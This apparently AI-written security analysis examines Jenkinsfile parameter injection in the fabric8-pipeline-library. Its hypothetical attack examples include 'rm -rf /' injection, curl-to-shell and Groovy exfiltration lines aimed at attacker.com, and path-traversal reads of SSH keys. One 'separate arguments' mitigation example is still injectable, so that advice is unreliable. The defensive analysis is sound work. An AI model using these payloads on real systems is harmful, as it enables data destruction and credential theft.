Okay, here's a deep analysis of the attack tree path 3.2.1: Jenkinsfile Parameters, focusing on the security implications within the context of the `fabric8-pipeline-library`.

## Deep Analysis: Jenkinsfile Parameter Injection (3.2.1)

### 1. Define Objective

The objective of this deep analysis is to:

*   Thoroughly understand the vulnerability associated with unvalidated Jenkinsfile parameters.
*   Identify specific attack vectors and scenarios relevant to the `fabric8-pipeline-library`.
*   Assess the potential impact of successful exploitation on applications using the library.
*   Propose concrete mitigation strategies and best practices to prevent this vulnerability.
*   Provide actionable recommendations for the development team.

### 2. Scope

This analysis focuses specifically on:

*   **Jenkinsfile parameters:**  How user-supplied or externally influenced parameters within a Jenkinsfile can be manipulated.
*   **`fabric8-pipeline-library`:**  The analysis will consider how the library's functions and shared steps might be vulnerable if they consume unvalidated parameters.  We'll look for common patterns and potential misuse.
*   **Code Injection:** The primary vulnerability type is code injection, specifically focusing on how parameters can be used to inject malicious shell commands, Groovy code, or other executable content.
*   **CI/CD Pipeline Context:**  The analysis will consider the typical CI/CD environment where the library is used, including access to secrets, deployment credentials, and build artifacts.

This analysis *excludes* other attack vectors not directly related to Jenkinsfile parameter injection (e.g., vulnerabilities in Jenkins itself, network-level attacks, or physical security).

1.  **Threat Modeling:**  We'll model potential attackers, their motivations, and their capabilities.
2.  **Code Review (Hypothetical & Targeted):**
    *   We'll examine hypothetical examples of vulnerable code patterns within a Jenkinsfile using the `fabric8-pipeline-library`.
    *   We'll perform a targeted code review (if access is granted) of specific parts of the `fabric8-pipeline-library` source code that handle parameters, looking for potential vulnerabilities.  This is crucial.
3.  **Vulnerability Analysis:** We'll analyze how an attacker could exploit unvalidated parameters to achieve various malicious goals.
4.  **Impact Assessment:** We'll assess the potential damage from successful exploitation, considering confidentiality, integrity, and availability.
5.  **Mitigation Recommendations:** We'll propose specific, actionable steps to prevent or mitigate the vulnerability.
6.  **Documentation:**  The findings and recommendations will be documented in this report.

### 4. Deep Analysis of Attack Tree Path 3.2.1: Jenkinsfile Parameters

#### 4.1 Threat Modeling

*   **Attacker Profiles:**
    *   **Malicious User:** A user with limited access to the Jenkins instance or the source code repository, but who can trigger builds and potentially influence parameter values (e.g., through pull requests, webhooks, or direct Jenkins UI interaction).
    *   **Compromised Third-Party Service:** A service integrated with the CI/CD pipeline (e.g., a code analysis tool, a notification service) that has been compromised and can inject malicious data into Jenkins parameters.
    *   **Insider Threat:** A user with legitimate access to the Jenkins instance or source code repository who intentionally introduces or exploits the vulnerability.

*   **Attacker Motivations:**
    *   **Data Exfiltration:** Stealing sensitive data (e.g., source code, API keys, database credentials) stored as environment variables or accessed during the build process.
    *   **System Compromise:** Gaining shell access to the Jenkins server or build agents to install malware, launch further attacks, or disrupt operations.
    *   **Code Tampering:** Modifying build artifacts or deployment scripts to introduce malicious code into the application.
    *   **Denial of Service:**  Disrupting the CI/CD pipeline by causing builds to fail or consume excessive resources.

*   **Attacker Capabilities:**
    *   **Basic:**  Ability to submit pull requests, trigger builds, and provide parameter values through the Jenkins UI or API.
    *   **Intermediate:**  Understanding of Groovy scripting and Jenkinsfile syntax; ability to craft malicious payloads.
    *   **Advanced:**  Deep understanding of the `fabric8-pipeline-library` and its internals; ability to exploit subtle vulnerabilities and bypass security controls.

#### 4.2 Vulnerability Analysis (Hypothetical Examples)

Let's consider some hypothetical examples of how unvalidated parameters could be exploited in a Jenkinsfile using the `fabric8-pipeline-library`.  These examples assume the library *might* be used in these ways (which needs verification through actual code review).

**Example 1: Direct Shell Command Injection**

```groovy
// Vulnerable Jenkinsfile snippet
pipeline {
    agent any
    parameters {
        string(name: 'userInput', defaultValue: '', description: 'User input')
    }
    stages {
        stage('Execute Command') {
            steps {
                script {
                    // Directly using the parameter in a shell command
                    sh "echo ${params.userInput}"
                }
            }
        }
    }
}
```

*   **Attack:** An attacker provides the following value for `userInput`:  `"hello; rm -rf /; echo"`
*   **Result:** The shell command becomes `echo hello; rm -rf /; echo`, which would attempt to delete the entire filesystem (if the Jenkins user has sufficient privileges).  Even without root privileges, significant damage could be done.

**Example 2:  Injection via `fabric8-pipeline-library` Function (Hypothetical)**

Let's assume the `fabric8-pipeline-library` has a function like this (this is a *hypothetical* example for illustration):

```groovy
// Hypothetical library function (fabric8-pipeline-library)
def executeCustomCommand(command) {
  sh "custom-tool --command '${command}'"
}
```

And a Jenkinsfile uses it like this:

```groovy
// Vulnerable Jenkinsfile snippet using the hypothetical function
pipeline {
    agent any
    parameters {
        string(name: 'customCommand', defaultValue: '', description: 'Custom command to execute')
    }
    stages {
        stage('Execute Custom Command') {
            steps {
                script {
                    executeCustomCommand(params.customCommand) // Using the hypothetical function
                }
            }
        }
    }
}
```

*   **Attack:** An attacker provides the following value for `customCommand`:  `'--help;  curl http://attacker.com/malware | sh; echo'`
*   **Result:** The shell command becomes `custom-tool --command '--help; curl http://attacker.com/malware | sh; echo'`, which would download and execute malware from the attacker's server.

**Example 3: Groovy Code Injection**

```groovy
// Vulnerable Jenkinsfile snippet
pipeline {
    agent any
    parameters {
        string(name: 'groovyScript', defaultValue: '', description: 'Groovy script to execute')
    }
    stages {
        stage('Execute Groovy') {
            steps {
                script {
                    // Directly executing the parameter as Groovy code
                    evaluate(params.groovyScript)
                }
            }
        }
    }
}
```

*   **Attack:** An attacker provides Groovy code that accesses and exfiltrates environment variables:
    `groovyScript = "println(System.getenv()); new URL('http://attacker.com/?data=' + System.getenv().toString()).getText()"`
*   **Result:** The attacker's server receives a request containing all the environment variables of the Jenkins build agent, potentially including sensitive secrets.

**Example 4:  Indirect Injection via File Manipulation**

```groovy
// Vulnerable Jenkinsfile snippet
pipeline {
    agent any
    parameters {
        string(name: 'fileName', defaultValue: 'config.txt', description: 'Name of the config file')
    }
    stages {
        stage('Read Config') {
            steps {
                script {
                    def config = readFile(params.fileName)
                    // Process the config...
                }
            }
        }
    }
}
```

*   **Attack:** An attacker provides a value for `fileName` that points to a sensitive file:  `fileName = "/etc/passwd"` or `fileName = "../../../.ssh/id_rsa"`
*   **Result:** The Jenkinsfile reads the contents of the sensitive file, potentially exposing it to further processing or logging.

#### 4.3 Impact Assessment

The impact of successful exploitation of this vulnerability is **High**, as stated in the attack tree.  Here's a breakdown:

*   **Confidentiality:**  High.  Attackers can steal secrets, source code, and other sensitive data.
*   **Integrity:** High.  Attackers can modify build artifacts, deployment scripts, and even the Jenkins configuration itself.
*   **Availability:** Medium to High.  Attackers can disrupt the CI/CD pipeline, cause builds to fail, or even take the Jenkins server offline.
* **Reputational Damage:** Data breaches and service disruptions can severely damage the reputation of the organization.
* **Financial Loss:** Data breaches can lead to fines, legal costs, and loss of business.

#### 4.4 Mitigation Recommendations

These are crucial steps to prevent and mitigate this vulnerability:

1.  **Input Validation (Whitelist Approach):**
    *   **Strictly validate all Jenkinsfile parameters.**  Do *not* rely on blacklisting (trying to block specific characters).
    *   **Use a whitelist approach.** Define a set of allowed characters, patterns, or values for each parameter.  Reject any input that doesn't match the whitelist.
    *   **Example (using `string` parameter):**
        ```groovy
        string(name: 'userInput', defaultValue: '', description: 'User input (alphanumeric only)',
               trim: true, // Remove leading/trailing whitespace
               regexp: /^[a-zA-Z0-9]+$/) // Regular expression for alphanumeric characters
        ```
    *   **Example (using `choice` parameter):**
        ```groovy
        choice(name: 'environment', choices: ['dev', 'staging', 'prod'], description: 'Deployment environment')
        ```
    *   **Use appropriate parameter types:**  If a parameter should be a boolean, use the `booleanParam` type.  If it should be a choice from a list, use the `choice` type.  This provides built-in validation.

2.  **Parameter Sanitization (If Whitelisting is Insufficient):**
    *   If you *must* allow a wider range of characters, sanitize the input *before* using it in any sensitive operation.
    *   **Escape special characters:**  Use appropriate escaping functions for the context (e.g., shell escaping, Groovy string escaping).  The `fabric8-pipeline-library` *should* provide helper functions for this.  If not, they need to be added.
    *   **Example (hypothetical sanitization function):**
        ```groovy
        // Hypothetical sanitization function (needs to be implemented correctly)
        def sanitizeForShell(input) {
          // ... (Implementation to escape shell metacharacters) ...
          return escapedInput
        }

        sh "echo ${sanitizeForShell(params.userInput)}"
        ```
        **Important:**  Sanitization is *less secure* than whitelisting and should only be used as a secondary defense.  It's easy to miss edge cases.

3.  **Avoid Direct Execution:**
    *   **Never directly embed parameters into shell commands, Groovy code, or other executable contexts.**
    *   **Use parameterized commands or APIs:**  If you need to interact with external tools, use their APIs or command-line interfaces in a way that allows you to pass parameters as separate arguments, *not* as part of a single string.
    *   **Example (using `sh` with separate arguments):**
        ```groovy
        sh script: "my-tool --input \"${params.userInput}\"", returnStdout: true
        ```
        Even better, use named arguments if the tool supports them:
        ```groovy
        sh "my-tool --input ${params.userInput.inspect()}" // Use .inspect() for safer string representation
        ```

4.  **Least Privilege:**
    *   **Run Jenkins agents with the minimum necessary privileges.**  Do not run them as root.
    *   **Use service accounts with limited permissions.**  If the pipeline needs to access external resources (e.g., cloud services), use service accounts with only the required permissions.

5.  **Code Review and Security Testing:**
    *   **Conduct regular code reviews of Jenkinsfiles and the `fabric8-pipeline-library` itself.**  Focus on how parameters are handled.
    *   **Perform penetration testing and dynamic analysis security testing (DAST) to identify potential vulnerabilities.**
    *   **Use static analysis tools (SAST) to automatically detect potential code injection vulnerabilities.**

6.  **`fabric8-pipeline-library` Specific Recommendations:**

    *   **Review all functions and shared steps in the library that accept parameters.**  Ensure they perform proper validation and sanitization.
    *   **Provide helper functions for common tasks like escaping shell commands and validating input.**  This will encourage developers to use safe practices.
    *   **Document best practices for using parameters securely within the library's documentation.**  Include clear examples of both vulnerable and secure code.
    *   **Consider adding built-in parameter validation to the library's functions.**  For example, a function that executes a shell command could accept a `command` parameter and an optional `arguments` parameter (as a list), and automatically handle the escaping.

7.  **Monitoring and Alerting:**
    *   **Monitor Jenkins logs for suspicious activity, such as failed builds with unusual parameter values.**
    *   **Set up alerts for security-related events.**

### 5. Conclusion

The "Jenkinsfile Parameters" attack vector (3.2.1) represents a significant security risk if not properly addressed.  Unvalidated parameters can lead to code injection, data breaches, and system compromise.  By implementing the mitigation recommendations outlined above, the development team can significantly reduce the likelihood and impact of this vulnerability, ensuring the security of applications using the `fabric8-pipeline-library`.  A thorough code review of the library itself is paramount to identify and fix any existing vulnerabilities. The combination of input validation, secure coding practices, least privilege, and regular security testing is essential for a robust defense.
